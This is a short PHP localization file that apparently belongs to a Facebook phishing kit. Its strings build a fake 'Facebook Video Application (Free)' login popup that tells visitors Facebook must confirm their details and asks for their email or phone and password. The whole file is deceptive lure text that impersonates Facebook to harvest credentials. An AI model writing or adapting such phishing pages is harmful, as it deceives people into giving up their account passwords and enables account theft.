<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'en';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Facebook application';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Video Application (Free)';
$lang['POPUP_DESCRIPCION'] = 'Facebook needs to confirm the following information to allow access to this application videos, Login!';
$lang['POPUP_CORREO'] = 'Email or phone';
$lang['POPUP_CONTRASENA'] = 'Password';
$lang['POPUP_SUBMIT'] = 'Log In';
$lang['POPUP_CANDADO'] = 'This application is not allowed to publish on Facebook.';